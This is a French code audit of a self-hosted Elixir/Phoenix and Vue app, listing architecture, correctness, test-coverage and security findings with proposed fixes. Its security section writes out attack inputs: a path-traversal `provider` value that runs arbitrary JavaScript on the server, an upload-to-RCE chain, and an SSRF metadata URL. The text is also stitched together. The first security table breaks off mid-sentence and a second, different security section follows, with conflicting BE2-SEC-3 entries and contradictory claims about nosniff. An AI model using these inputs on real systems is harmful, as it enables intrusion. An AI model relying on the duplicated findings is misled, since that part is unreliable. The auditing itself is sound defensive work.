# Audit de code — Servant — 2026-07-03

**Périmètre :** dépôt complet — passe **Backend** (Elixir/Phoenix, `lib/`, `test/`) puis passe **Frontend** (Vue 3, `frontend/src/`), 8 phases chacune, synthèse transversale finale.

**Contexte :** ré-audit. Le précédent audit (`code-audit-2026-06-22.md`) a été largement remédié via les checklists du 2026-06-23 (backend : toutes sections traitées sauf items ⏭️ arbitrage ; frontend : 22/24, FE-TEST différé). Depuis, ~7 000 lignes ont changé : nouvelle app **Notes** (wikilinks, backlinks, mentions), chiffrement des secrets connecteurs au repos (Cloak-like, `Servant.Encrypted`), auth cookie HttpOnly (`/files` + token SPA), miniatures média, réécriture des 4 mini-apps en composants Vue, pagination des entrées.

**Items volontairement non traités lors du cycle précédent** (à réévaluer ici) : BE-ARCH-3 (contexte Connectors surchargé), BE-SEC-5 (TLS verify_none), BE-SEC-9 (inscription ouverte/throttle), BE-SEC-10 (secrets dev), BE-PERF-4 (miniatures async), BE-CLEAN-5, BE-DEP-4, FE-TEST (aucun test frontend), échec préexistant `BankCSV.ParserTest`.

---

# Synthèse transversale

## Résumé exécutif

Le socle est **sain et bien tenu** : le cycle de remédiation précédent a payé (SSRF, redaction, chiffrement au repos, cookie HttpOnly, pagination, deps fraîches, 246 tests backend au vert, rendu markdown des notes vérifié sans XSS). Les risques restants ne sont pas des dettes de structure mais **deux familles de fragilité** : (1) la **résilience des connecteurs** — un `Worker` `:permanent` qui, sur une simple config invalide, peut faire tomber *tous* les connecteurs de *tous* les users (BE2-BUG-1), plus une série de bugs de curseur/refresh qui causent des **pertes de données silencieuses** (Solana, EVM, Strava) ; et (2) le **temps réel côté SPA** — le signal bulk `entries_changed` n'est pas écouté et chaque `entry_change` refetch tout, produisant à la fois des listes obsolètes *et* une tempête de requêtes (BE2-BUG-3/FE2-PERF-1). Deux angles morts persistent : **couverture backend à 53 %** (les connecteurs complexes quasi non testés, là où vivent les bugs de perte de données) et **zéro test frontend**. Un vecteur d'exécution de code arbitraire (nom de provider du scraper non validé, BE2-SEC-1) est le seul point réellement critique en sécurité.

**Thèmes récurrents** : perte de données silencieuse (curseurs connecteurs + `on_conflict: :nothing` sur `external_id` instables) ; le worker lit sa config une seule fois (restart/édition ⇒ état périmé) ; helpers de sécurité existants mais **non appliqués partout** (`safeUrl` côté contact, redaction par blocklist) ; le framework `apps/` impératif comme principale dette structurelle frontend.

## Top priorités (à traiter d'abord)

1. **BE2-SEC-1 — 🔴 Path traversal → exécution JS arbitraire** (`invoice_scraper_connector.ex:86`) : valider `provider` contre une allowlist côté Elixir + regex `[a-z0-9_]` côté JS. *Le seul critique sécurité, effort quick.*
2. **BE2-BUG-1 — 🔴 Tempête de restarts tue tous les connecteurs** (`worker.ex:56`) : `restart: :transient` (ou `:ignore` sur erreur de config). *Effort quick, impact multi-utilisateurs.*
3. **BE2-BUG-4 / BE2-BUG-5 — 🟠 Pertes de données blockchain** (curseur Solana au-delà d'une tx en échec ; collision d'`external_id` EVM multi-transferts) : halte du reduce à la 1ʳᵉ erreur ; id incluant contrat+log index.
4. **BE2-BUG-2 — 🟠 Refresh token Strava perdu → connecteur cassé définitivement** (`strava_connector.ex:69`) : propager le state rafraîchi sur toutes les branches d'erreur.
5. **BE2-BUG-3 / FE2-BUG-3 / FE2-PERF-1 — 🟠 Temps réel SPA** : écouter `entries_changed`, débouncer/coalescer les refetch sur `entry_change`. *Corrige à la fois données obsolètes et tempête de requêtes.*
6. **BE2-BUG-6 — 🟠 Fichiers legacy 404 pour leur propriétaire** (régression BE-SEC-1) : vérifier la propriété via le `user_id` du chemin legacy, ou migrer + supprimer le fallback.
7. **BE2-BUG-3(iCal) — 🟠 Crash worker sur date iCal invalide** (`ical_connector.ex:184`) : `Date.new`/`Time.new` tuple. *Un feed malformé ne doit pas tuer le GenServer.*
8. **FE2-SEC-1 — 🟠 XSS stocké via `url` de contact** (`ContactDetailView.vue:314`) : router par le `safeUrl` déjà existant.
9. **BE2-SEC-2 — 🟠 `verify_none` TLS global** (`http.ex`) : réserver aux hôtes problématiques connus, `verify_peer` pour Strava/OAuth et les explorers/RPC.
10. **BE2-SEC-4 — 🟠 Inscription ouverte + aucun rate-limit** login/register : défaut `false` + throttling.
11. **BE2-TEST-1 / FE2-TEST-1 — 🟠 Angles morts de test** : tests des curseurs connecteurs (là où sont les bugs #3/#4), et Vitest sur les utilitaires purs frontend.

## Quick wins (faible effort, valeur immédiate)

- **BE2-BUG-1** (`restart: :transient`) et **BE2-SEC-1** (allowlist provider) — quelques lignes, impact critique.
- **BE2-BUG-8 / BE2-DOC-1** — câbler `CONNECTOR_ENCRYPTION_KEY` dans `runtime.exs` (ou corriger le README) : la doc promet une protection inexistante.
- **FE2-DOC-1** — corriger `_servant_file_auth` → `_servant_auth` dans le README.
- **BE2-BUG-15** — clamp `per_page` dans `[1, max]` (`per_page=0` → 500).
- **FE2-BUG-1** — remplacer `toISOString().slice(0,10)` par `formatISODate` (bug de date calendrier hors UTC).
- **FE2-SEC-1** — appliquer `safeUrl` au `:href` du détail contact.
- **BE2-ARCH-2 / BE2-DEP-5** — supprimer les schémas morts `Credential`/`Setting` (+ migrations) si confirmés inutilisés.
- **FE2-ARCH-4** — dédupliquer l'interface `Entry` (une seule source).

## Notes de confiance

- Tous les constats backend/frontend ont été **vérifiés sur le code** (lignes citées). Suite backend exécutée réellement (246 tests, 0 échec ; couverture 52,9 %).
- Non exécuté : build frontend (`npm run build`) et `npm audit` racine (seul `priv/scrapers` audité = 0 vuln) — versions manifestes récentes, pas de CVE connue supposée.
- **BE2-BUG-6** (fichiers legacy) marqué *high* mais dépend de l'existence réelle de fichiers pré-migration chez l'utilisateur — à confirmer avant de prioriser.
- L'advisory `decimal` (BE2-DEP-1) est **connue et ignorée volontairement** dans `precommit` (bloquée par ecto) — pas une régression.

---

# PASSE BACKEND (Elixir / Phoenix)

## Phase 1 — Architecture

### Carte du backend (à réutiliser dans les phases suivantes)

- **Arbre OTP** (`application.ex`) : Telemetry → Repo (SQLite) → Ecto.Migrator → DNSCluster (no-op) → PubSub → `Connectors.Registry` (clé `{user_id, config_id}`) → `Connectors.Supervisor` (DynamicSupervisor) → `Connectors.Scheduler` (démarre les connecteurs activés au boot) → Endpoint.
- **Contextes** : `Accounts` (users, Bcrypt) · `Data` (entrées universelles, pagination, broadcasts PubSub `data:<user_id>`) · `Notes` (notes = entries `kind:"note"` + table `note_links`, wikilinks/mentions/tags, propagation de renommage) · `Connectors` (configs chiffrées + lifecycle workers + sync logs + env partagé + import fichier) · `Storage` (arborescence FILES_DIR/user, chemins legacy) · `Media` (Thumbnail vix, Exif) · `Encrypted` (type Ecto AES-256-GCM) · `HTTP` (options Req + garde SSRF).
- **Web** : plug `Auth` (Bearer **ou** cookie HttpOnly `_servant_auth`) · plug `FileAuth` (cookie seul, pour `/files`+`/uploads`) · contrôleurs JSON fins · `UserSocket`/`DataChannel` (Phoenix.Token, topic par user) · `SpaController` (catch-all + CSP) · 12 connecteurs implémentant le behaviour `Connector` (sync périodique via Worker GenServer, curseurs persistés via `persisted_config/1`).
- **Flux clé** : connecteur → `sync/1` → `Data.create_entries` (insert_all + broadcast agrégé `entries_changed`) → DataChannel → SPA.

### Constats

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-ARCH-1 | 🟠 high | `lib/servant/notes.ex:62`, `lib/servant_web/controllers/entry_controller.ex:63-88` | **Double propriété des notes.** Une note est une `Entry`, donc `PUT/DELETE /api/entries/:id` peut modifier une note **en contournant le contexte Notes** : pas de re-sync des `note_links`, pas de validation de slug, pas de propagation de renommage → backlinks/graph obsolètes silencieusement. Fix : dans `Data.update_entry`/`delete_entry`, déléguer (ou refuser) quand `kind == "note"` ; ou filtrer les notes hors de l'API entries générique. |
| BE2-ARCH-2 | 🟡 medium | `lib/servant/connectors/credential.ex`, `lib/servant/settings/setting.ex` | **Schémas morts.** `Credential` et `Setting` ne sont référencés nulle part (le worker passe toujours `credentials: %{}` ; aucun contexte Settings). Tables `credentials`/`settings` et callback `required_credentials()` du behaviour = plomberie vestigiale qui suggère un mécanisme de secrets qui n'existe pas (les secrets vivent en réalité dans `connector_configs.config` chiffré). Fix : supprimer schémas + migrations drop, ou documenter l'intention. |
| BE2-ARCH-3 | 🟡 medium | `lib/servant/connectors.ex` (373 l.) | **Contexte `Connectors` toujours surchargé** (= BE-ARCH-3 ⏭️ du cycle précédent, +70 lignes depuis) : CRUD configs + redaction + lifecycle + sync logs + cache env + import fichier dans un seul module. Le découpage (`Connectors.Lifecycle`, `.Imports`) reste pertinent maintenant que l'import a grossi (`run_import/10` à 10 arguments). |
| BE2-ARCH-4 | 🟡 medium | `lib/servant/storage.ex:146-180` | **Chaîne de résolution legacy** (`app_files/`, `avatars/`, `UPLOADS_DIR`) : 3 niveaux de fallback qui compliquent chaque lecture et interagissent mal avec le contrôle de propriété (voir BE2-BUG en phase 2). Fix : script de migration one-shot des fichiers legacy vers la nouvelle arborescence, puis suppression du code de fallback. |
| BE2-ARCH-5 | ⚪ low | `lib/servant/connectors/worker.ex:113-128` | `update_sync_status/2` fait du `Repo` direct (avec `alias` inline dans le corps de fonction) au lieu de passer par le contexte `Connectors` comme le reste du worker. Fix : déplacer dans `Connectors`. |
| BE2-ARCH-6 | ⚪ low | `lib/servant_web/endpoint.ex:14-16,44-46` | Socket `/live` (LiveView) et `LiveDashboard.RequestLogger` câblés dans un projet API-only sans LiveView (le dashboard n'existe qu'en dev). Fix : limiter à l'env dev ou retirer. |
| BE2-ARCH-7 | ⚪ low | `lib/servant_web/auth.ex:12`, `lib/servant_web/channels/user_socket.ex:8` | Constante 30 jours + sel `"user auth"` dupliqués entre `Auth` et `UserSocket` (une divergence casserait silencieusement le socket ou allongerait la fenêtre de validité). Fix : `UserSocket` doit appeler `Auth.verify_token/2`. |
| BE2-ARCH-8 | ⚪ low | `lib/servant/data.ex:233`, `lib/servant/notes.ex:430` | `broadcast/2` (même topic, même sémantique) dupliqué dans deux contextes. Fix : helper partagé (p.ex. `Servant.Events`). |

**Seam front↔back (noté ici, exploité en phase Sécurité)** : le token du socket est re-signé et renvoyé par `GET /api/auth/me` (`auth_controller.ex:87`) — c'est un token d'auth **complet, 30 j**, récupérable en JS, ce qui limite le bénéfice du cookie HttpOnly (FE-SEC-3). À réévaluer en phase 4.

## Phase 2 — Bugs / correctness

*(Revue directe des modules cœur + 2 agents parallèles sur les 12 connecteurs. Chaque constat vérifié sur le code.)*

### Critiques / élevés

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-BUG-1 | 🔴 critical | `lib/servant/connectors/worker.ex:56-58`, `application.ex:18` | **Tempête de restarts → tous les connecteurs morts.** Worker sans `child_spec` custom = restart `:permanent` ; `init` renvoie `{:stop, reason}` sur erreur de config (ex. `:missing_wallet_address`, rien ne valide les clés de config). Un seul config invalide activé au boot → 3 échecs/5 s → le **DynamicSupervisor lui-même s'arrête**, tuant les workers de *tous* les users ; il redémarre vide (le Scheduler ne retourne pas). Fix : `use GenServer, restart: :transient` (ou `:ignore` pour les erreurs de config permanentes) + envisager `max_restarts` isolé. |
| BE2-BUG-2 | 🟠 high | `lib/servant/connectors/strava_connector.ex:69-79` | **Refresh token Strava tourné puis perdu.** Dans le `with`, le `state` rebindé par `ensure_access_token` n'est pas visible dans le `else` : sur erreur de `fetch_all_activities` (ex. 429), on renvoie le state **d'avant refresh** (RT1) alors que Strava a déjà rotaté vers RT2 ; `persisted_config` n'est appelé que sur succès. Dès expiration du token d'accès en cache (~6 h), refresh avec RT1 invalide → **connecteur définitivement cassé** jusqu'à reconfiguration. Fix : propager le state rafraîchi sur toutes les branches d'erreur. |
| BE2-BUG-3 | 🟠 high | `lib/servant/connectors/ical_connector.ex:184-211` | **Crash worker sur date iCal invalide bien formée.** La regex ne vérifie que la forme ; `Date.new!`/`Time.new!` lèvent sur `20250230T120000Z` ou heure `24` (émis par des générateurs cassés) → crash du GenServer (sync URL) ou 500 (import). Un seul VEVENT malformé tue tout le flux. Fix : variantes tuple `Date.new`/`Time.new` → `{:error, :invalid_format}`. |
| BE2-BUG-4 | 🟠 high | `lib/servant/connectors/solana_connector.ex:78-111` | **Curseur Solana avancé au-delà d'une tx en échec → perte définitive.** Sur erreur RPC transitoire le curseur n'avance pas, mais le reduce **continue** et un succès ultérieur le pousse plus loin (`sig3`) ; la sync suivante (`until: sig3`) ne reverra jamais `sig2`. Fix : stopper le reduce à la première erreur (ou plafonner le curseur avant la première signature en échec). |
| BE2-BUG-5 | 🟠 high | `lib/servant/connectors/evm_connector.ex:125`, `evm/transaction_parser.ex:108` | **Collision d'`external_id` EVM → transferts silencieusement perdus.** `external_id = "#{tx_hash}-erc20"` : une tx avec plusieurs événements Transfer (swap Uniswap, multi-send) → ids identiques, `on_conflict: :nothing` ne garde que le premier. Fix : inclure contrat token + log index dans l'id. |
| BE2-BUG-6 | 🟠 high | `lib/servant/storage.ex:114-129,176-180`, `lib/servant_web/controllers/files_controller.ex:13` | **Fichiers legacy 404 pour leur propriétaire** (régression BE-SEC-1). `resolve_owned_path/2` exige un chemin sous `FILES_DIR/<user_id>/`, mais le fallback legacy résout sous `UPLOADS_DIR` (et `app_files/<uid>/…` sous `FILES_DIR` sans préfixe user) → jamais conformes → tout fichier ancien format est inservable ; les miniatures backfillées depuis un chemin legacy sont écrites sous `FILES_DIR/app_files/…` et inaccessibles aussi. Fix : vérifier la propriété à partir du `user_id` embarqué dans le chemin legacy, ou (mieux, cf. BE2-ARCH-4) migrer les fichiers et supprimer le fallback. |
| BE2-BUG-7 | 🟠 high | `lib/servant/connectors/solana/transaction_parser.ex:98-115` | **Contrepartie toujours `nil` pour les transferts SOL entrants** : deux `if` successifs dont seul le dernier est la valeur du bloc — le résultat du premier (cas `diff > 0`) est jeté. Tout paiement SOL reçu affiche « from unknown ». Le test « incoming SOL transfer » omet justement l'assertion `counterparty`. Fix : fusionner en une seule expression (motif déjà correct dans `find_spl_counterparty/5`). |

### Moyens

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-BUG-8 | 🟡 medium | `config/runtime.exs`, `README.md:64` | **`CONNECTOR_ENCRYPTION_KEY` documentée mais jamais lue** : `runtime.exs` ne câble pas la variable → la définir n'a aucun effet ; l'utilisateur croit ses secrets sous clé dédiée alors qu'ils dépendent de `SECRET_KEY_BASE` (rotation = secrets perdus sans prévenir). Fix : `config :servant, connector_encryption_key: System.get_env("CONNECTOR_ENCRYPTION_KEY")` dans le bloc prod. |
| BE2-BUG-9 | 🟡 medium | `lib/servant/connectors/worker.ex:62-98` | **Multiplication des timers de sync.** `do_sync` ré-arme toujours le timer : chaque `sync_now` manuel ajoute une **chaîne périodique supplémentaire** qui persiste (3 syncs manuels = 4 chaînes parallèles). Fix : garder la ref du timer dans le state et l'annuler avant d'en poser un autre. |
| BE2-BUG-10 | 🟡 medium | `lib/servant/connectors/worker.ex:102-104`, `connector_config.ex:8` | **Schedule `"continuous"` = boucle CPU** sans délai (`send(self(), :sync)` re-armé à chaque fin), qui insère un `sync_log` par itération → 100 % CPU + croissance illimitée de la table. Fix : plancher de délai ou retrait du schedule. |
| BE2-BUG-11 | 🟡 medium | `lib/servant/connectors.ex:340-364`, `connector_environment.ex:17-22` | **`put_env/5` : upsert non atomique** (get puis insert) sans `unique_constraint` dans le changeset → deux workers résolvant le même mint SPL simultanément = `Ecto.ConstraintError` (crash mi-sync, amplifié par BE2-BUG-1). Fix : `Repo.insert(..., on_conflict: {:replace, …}, conflict_target: …)`. |
| BE2-BUG-12 | 🟡 medium | `lib/servant/connectors.ex:114-123`, `worker.ex:35-53` | **Restart superviseur = opts périmés.** Le restart rejoue les opts capturés au `start_child` : curseur (`last_block`…) revenu à sa valeur de démarrage → re-scan complet (rate-limit/ban RPC) ; de même, **toute édition de config d'un worker vivant est sans effet** jusqu'à stop/start manuel. Fix : relire `ConnectorConfig` en DB dans `init/1` + redémarrer le worker sur update. |
| BE2-BUG-13 | 🟡 medium | `lib/servant/connectors/bank_csv/parser.ex:198-211` | **Parsing RFC4180 mort** : `parse_string/1` (défaut `skip_headers: true`) consomme l'unique ligne comme en-tête → retourne `[]` → fallback naïf `String.split(",")` systématique → un champ quoté contenant une virgule (`"Smith, John"`) décale montant/devise. Fix : `skip_headers: false` (ou parser tout le contenu en un passage). |
| BE2-BUG-14 | 🟡 medium | `lib/servant/connectors/ical_connector.ex:157-158,199-201` | **`TZID` ignoré** : `DTSTART;TZID=Europe/Paris:20250315T120000` → traité comme UTC → événements décalés de 1-2 h (cas très courant dans les feeds Google/Outlook). Fix : capturer le paramètre TZID et convertir (tzdata). |
| BE2-BUG-15 | 🟡 medium | `lib/servant_web/controllers/entry_controller.ex:14` | **`per_page=0` → 500** : `ceil(total / per_page)` → `ArithmeticError`. (`per_page` négatif → `LIMIT -1` SQLite = tout renvoyer.) Fix : clamp `per_page` dans `[1, max]` (aussi côté `Data.apply_pagination`). |
| BE2-BUG-16 | 🟡 medium | `lib/servant/notes.ex:349-355` | **Titres ambigus : résolution non déterministe.** `resolve_targets` construit une map `canon(titre) → id` : deux notes de même titre dans des dossiers différents s'écrasent (dernier `Repo.all` gagne) → backlinks/renommages pouvant viser la mauvaise note. Fix : résolution par chemin complet d'abord, titre seul seulement si unique. |

### Faibles

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-BUG-17 | ⚪ low | `lib/servant/connectors/worker.ex:74,78` | `{:ok, _} = create_sync_log/create_entries` : un pépin DB transitoire crash le worker (amplifié par BE2-BUG-1/12). Gérer `{:error, _}`. |
| BE2-BUG-18 | ⚪ low | `lib/servant/connectors/strava_connector.ex:106-112` | 200 sans `expires_at` numérique → `DateTime.from_unix!(nil)` lève dans le `with` → crash worker au lieu de `{:error, _, state}`. |
| BE2-BUG-19 | ⚪ low | `lib/servant/connectors.ex:225-232` | `File.cp!` exécuté **avant** le `try` : s'il lève (disque plein), le workspace tmp n'est jamais nettoyé. Déplacer dans le `try`. |
| BE2-BUG-20 | ⚪ low | `lib/servant/connectors.ex:169-181` | `persist_connector_cursor` : read-merge-write non transactionnel → une édition API concurrente peut être écrasée (lost update). |
| BE2-BUG-21 | ⚪ low | `lib/servant/data.ex:114-115` | `create_entries` n'accepte que `%DateTime{}` pour `occurred_at` (une string ISO → `nil` silencieux), alors que `create_entry` (changeset cast) accepte l'ISO. Incohérence piégeuse pour un futur connecteur. |
| BE2-BUG-22 | ⚪ low | `lib/servant_web/changeset_helpers.ex:14` | `String.to_existing_atom(key)` peut lever si un message d'erreur contient un placeholder inattendu → 500 au lieu de 422. |
| BE2-BUG-23 | ⚪ low | `lib/servant/connectors/evm/explorer.ex:24-26`, `evm_connector.ex:106-109` | Troncature à 50 pages × 1000 tx : si la limite tombe **au milieu d'un bloc**, le reste du bloc est sauté à la sync suivante (`last_block+1`). Wallet très actif seulement. |
| BE2-BUG-24 | ⚪ low | `lib/servant/connectors/evm_connector.ex:65-66` | `min_wei`/`last_block` lus via `Map.get` (string) alors que `wallet_address`/`explorer_url` passent par `config_value` (string+atom) — incohérent. |
| BE2-BUG-25 | ⚪ low | `lib/servant/connectors.ex:366-372` | `cleanup_expired_env/0` n'est appelé nulle part → lignes expirées accumulées indéfiniment. |
| BE2-BUG-26 | ⚪ low | `lib/servant/connectors/vcard_connector.ex:67-78` | `fetch_vcf` : erreur Req brute (term) propagée sans stringification, incohérent avec les autres connecteurs. (Le manque de garde SSRF est traité en phase 4.) |
| BE2-BUG-27 | ⚪ low | `lib/servant/connectors/invoice_scraper_connector.ex:158` | Titre codé en dur avec `$` quel que soit `invoice["currency"]` (la devise stockée est correcte). Cosmétique. |
| BE2-BUG-28 | ⚪ low | `lib/servant/connectors/hyperevm/rpc.ex:71-72`, `solana/transaction_parser.ex:49-52` | Crashs latents défensifs : `String.to_integer("0x…", 16)` sur hex malformé (chemin RPC inutilisé) ; `find_account_index` sans clause catch-all. |

**Note** : l'échec préexistant `BankCSV.ParserTest` « returns empty for empty CSV » signalé au cycle précédent **n'existe plus** — le test attend désormais `{:error, "Empty CSV"}` et passe. Point clos.

**Sains** : `rss_connector.ex`, `apple_health_connector.ex` (+ parser XML), `tx_format.ex`, wrappers ethereum/arbitrum/base, `hyperevm_*` (délégations), `scheduler.ex`, `exif.ex`, `thumbnail.ex` (pagination keyset correcte).

## Phase 3 — Tests & couverture

**Environnement OK** : suite exécutée réellement (`VIX_COMPILATION_MODE=PLATFORM_PROVIDED_LIBVIPS`). Résultat : **246 tests, 0 échec** (~29 s). Bonne hygiène : aucun `Process.sleep`, 18 fichiers `async: true`, fixtures/`register_and_log_in_user` en place (acquis du cycle précédent). L'échec préexistant BankCSV signalé en 2026-06 est résolu.

**Couverture globale : 52,9 %** (`mix test --cover` échoue au seuil par défaut de 90 % ; la couverture n'est pas dans `mix precommit`).

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-TEST-1 | 🟠 high | `lib/servant/connectors/evm_connector.ex`, `evm/explorer.ex` (0 %), `solana_connector.ex` (11,7 %), `strava_connector.ex` (3,7 %) | **Les connecteurs les plus complexes sont quasi non testés** — précisément là où vivent BE2-BUG-2/4/5/23 (curseurs, pagination, refresh OAuth). Aucun `evm_connector_test.exs` ni test Strava. Priorité : tests du reduce curseur Solana (erreur-puis-succès), collision d'external_id EVM, rotation refresh token Strava (mock Req). |
| BE2-TEST-2 | 🟠 high | `test/servant/connectors/worker_test.exs` (55 l.) | **Cycle de vie du worker non testé** : uniquement le happy-path `on_demand`. Ni échec d'`init` (tempête de restarts BE2-BUG-1), ni multiplication des timers (BE2-BUG-9), ni `"continuous"` (BE2-BUG-10), ni branche `{:error, reason, state}`. |
| BE2-TEST-3 | 🟡 medium | `test/servant_web/controllers/` | **UploadController, ExportController, AppController : 0 %** (reliquat BE-TEST-4 🔶 du cycle précédent). L'upload (validation taille/type, EXIF, miniatures) et l'export (échappement iCal) sont des chemins à risque sans filet. |
| BE2-TEST-4 | 🟡 medium | `test/servant/connectors/hyperevm/transaction_parser_test.exs:1` | **Fichier de test mal rangé** : il teste `Servant.Connectors.EVM.TransactionParser` (renommage EVM passé par là) → `HyperEVM.TransactionParser` affiche 0 % et le mauvais chemin trompe le lecteur. Déplacer vers `test/servant/connectors/evm/`. |
| BE2-TEST-5 | 🟡 medium | `test/servant/connectors/solana/transaction_parser_test.exs:50-66`, `ical_connector_test.exs`, `bank_csv/parser_test.exs` | **Assertions manquantes qui masquent les bugs de phase 2** : le test « incoming SOL transfer » omet `counterparty` (masque BE2-BUG-7) ; aucun cas de date iCal malformée (BE2-BUG-3) ; aucun champ CSV quoté contenant une virgule (BE2-BUG-13). |
| BE2-TEST-6 | ⚪ low | `lib/servant_web/channels/user_socket.ex` (16,7 %), `connector_environment.ex` (0 %), `media/exif.ex` (0 %) | Vérification du token socket, `get_env`/`put_env` (expiration, upsert, course BE2-BUG-11) et parsing EXIF (DMS/GPS, dates) sans tests directs. |
| BE2-TEST-7 | ⚪ low | `mix.exs:76-84` | La couverture n'est pas suivie : pas de `--cover` (avec seuil réaliste, p.ex. 60 % montant) dans `precommit`, donc la jauge ne peut que dériver. |

## Phase 4 — Sécurité

*Contexte de menace : app personnelle auto-hébergée,**mais** l'inscription est ouverte par défaut (`registration_enabled: true`) — les constats « multi-user » sont donc réalistes tant que BE-SEC-9 n'est pas tranché.*

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-SEC-1 | 🔴 critical | `priv/scrapers/invoice_scraper.js:51`, `lib/servant/connectors/invoice_scraper_connector.ex:34,86` | **RCE via traversal du `provider`.** Le script Node fait `require(path.join(__dirname, "providers", providerName + ".js"))` avec `provider` = config utilisateur non validée. `path.join` n'empêche pas `../..` → n'importe quel `.js` du disque est exécuté côté serveur. Chaîne complète : l'upload (`/api/uploads`, type inconnu → extension d'origine conservée, donc `.js` accepté) renvoie le chemin du fichier stocké → `provider: "../../../…/files/<uid>/apps/files/<uuid>"` → sync → **exécution de code arbitraire** sous l'utilisateur du serveur. Fix : valider `provider` contre `~r/^[a-z0-9_]+$/` **des deux côtés** (Elixir + JS) et/ou allowlist des fichiers présents dans `providers/`. |
| BE2-SEC-2 | 🟠 high | `lib/servant/http.ex:15-27` | **TLS `verify: :verify_none` global** (= BE-SEC-5 ⏭️, toujours ouvert) : toutes les requêtes connecteurs (dont l'échange OAuth Strava — client_secret + refresh_token en clair pour un MITM) acceptent n'importe quel certificat. Le commentaire invoque un bug OTP 27 ; OTP 27.2+ a corrigé les régressions `key_usage` connues. Fix : réactiver `verify_peer` + castore, et ne dégrader (option par connecteur) que sur les hôtes réellement problématiques. |
| BE2-SEC-3 | 🟠 high | `lib/servant_web/controllers/upload_controller.ex:95-97`, `files_controller.ex:14-18` | **XSS stocké via `/files`.** L'« allowlist » de types n'en est pas une : type inconnu → extension d'origine conservée (`.html`, `.svg`…) ; `FilesController` sert ensuite avec `MIME.from_path` (→ `text/html`) sur la même origine que la SPA, sans `nosniff` ni `Content-Disposition`. Un HTML uploadé (par la victime via partage, ou tout contenu d'un autre user si
## Phase 4 — Sécurité

**Acquis solides du cycle précédent** : SSRF `Servant.HTTP.ensure_public_url` (RSS/iCal), garde de propriété `resolve_owned_path/2` sur `/files`, redaction des secrets, chiffrement au repos AES-256-GCM, `Bcrypt.no_user_verify` (anti-timing), CSP stricte (`script-src 'self'`), token hors localStorage. Scoping `user_id` cohérent sur toutes les requêtes.

| ID | Sév. | Localisation | Constat |
|----|------|--------------|---------|
| BE2-SEC-1 | 🔴 critical | `lib/servant/connectors/invoice_scraper_connector.ex:86`, `priv/scrapers/invoice_scraper.js:51` | **Path traversal → exécution de JS arbitraire.** Le `provider` (clé de config **contrôlée par l'utilisateur**, non validée) est passé tel quel à `require(path.join(__dirname, "providers", "${providerName}.js"))`. Un `provider` = `../../../../tmp/evil` charge et **exécute** n'importe quel `.js` du disque dans le process Node (avec les creds en env). Combiné à l'upload de fichiers, chemin plausible vers RCE. Fix : valider `provider` contre une allowlist (`Map.keys` des providers connus) côté Elixir **et** rejeter tout caractère non `[a-z0-9_]` côté JS. |
| BE2-SEC-2 | 🟠 high | `lib/servant/http.ex:1-27` | **`verify: :verify_none` global sur tout le trafic connecteur** (= BE-SEC-5 ⏭️). Aucune validation de certificat TLS pour Strava (OAuth + refresh token !), les explorers EVM, les RPC Solana/HyperEVM — exposition MITM sur des flux qui portent des secrets et des données financières. La justification (bug OTP 27 key_usage_mismatch sur data.gouv.fr) ne concerne qu'iCal/RSS. Fix : réserver `verify_none` aux hôtes problématiques connus, `verify_peer` (CAStore) partout ailleurs — surtout OAuth. |
| BE2-SEC-3 | 🟠 high | `lib/servant_web/controllers/auth_controller.ex:80-97` | **`GET /api/auth/me` renvoie un token d'auth complet 30 j lisible en JS**, annulant en grande partie le bénéfice du cookie HttpOnly (BE-SEC-3/FE-SEC-3) : un XSS peut exfiltrer un token longue durée via `/me`. Fix : token socket dédié à portée réduite (audience « socket », TTL court) au lieu de re-signer le token d'auth complet. |
| BE2-SEC-4 | 🟠 high | `lib/servant_web/controllers/auth_controller.ex:7-43`, `config/config.exs:13` | **Inscription ouverte par défaut, sans throttling** (= BE-SEC-9 ⏭️). `registration_enabled: true` par défaut + aucun rate-limit sur `/auth/register` ni `/auth/login` (pas de `Hammer`/PlugAttack) → énumération de comptes, bruteforce de mots de passe, création de masse. Sur un self-hosted exposé, un opérateur qui oublie `REGISTRATION_ENABLED=false` laisse la porte ouverte. Fix : défaut `false` + rate-limit login/register. |
| BE2-SEC-5 | 🟡 medium | `lib/servant/connectors/vcard_connector.ex:67-78` | **Garde SSRF manquante sur le fetch vCard URL** (aussi noté BE2-BUG-26) : contrairement à RSS/iCal, `fetch_vcf/1` appelle `Req.get` sans `ensure_public_url` → un connecteur vCard configuré sur `http://169.254.169.254/…` atteint le metadata interne. Fix : ajouter la garde comme les autres connecteurs fetch-URL. |
| BE2-SEC-6 | 🟡 medium | `lib/servant_web/endpoint.ex:7-12`, `config/config.exs`, `config/dev.exs:21` | **`signing_salt`/`live_view` signing salt en dur dans le repo** + `secret_key_base` dev commité. Le salt de session Endpoint (`"ZbJqQ+IZ"`) est compile-time et versionné. Pour un self-hosted, l'ensemble des sels/clefs par défaut devrait dériver de `SECRET_KEY_BASE`. Fix : sortir les sels en config runtime dérivée du secret. |
| BE2-SEC-7 | 🟡 medium | `lib/servant_web/controllers/upload_controller.ex:6-17,95-97` | **Type de fichier fixé sur le `content_type` déclaré par le client**, non vérifié par magic bytes ; `application/octet-stream` accepte tout (ext vide). Un fichier peut être stocké sous une extension mensongère. Servi avec `MIME.from_path` + `X-Content-Type-Options: nosniff` (bon), donc risque limité au stockage. Fix : sniffer le type réel (`:infer`/magic bytes) au moins pour la branche images. |
| BE2-SEC-8 | 🟡 medium | `lib/servant/connectors.ex:66-98` | **Redaction par sous-chaîne de nom de clé** : un secret stocké sous une clé qui ne contient pas password/secret/token/… (p.ex. `cookie`, `session`, `auth`, `pin`) est renvoyé **en clair** par l'API. Fix : allowlist explicite des clés publiques par connecteur, plutôt qu'une blocklist par sous-chaîne. |
| BE2-SEC-9 | ⚪ low | `lib/servant/accounts/user.ex:32` | Regex email `~r/^[^\s]+@[^\s]+$/` très permissive (accepte `a@b`). Cosmétique (pas de vérification d'email de toute façon). |
| BE2-SEC-10 | ⚪ low | `lib/servant_web/endpoint.ex:51-54` | `Plug.Parsers` sans `length:` explicite → limite JSON par défaut (~8 Mo) ; l'upload est plafonné séparément à 50 Mo mais un POST JSON volumineux sur `/api/entries` n'est borné que par le défaut implicite. Confirmer/expliciter. |

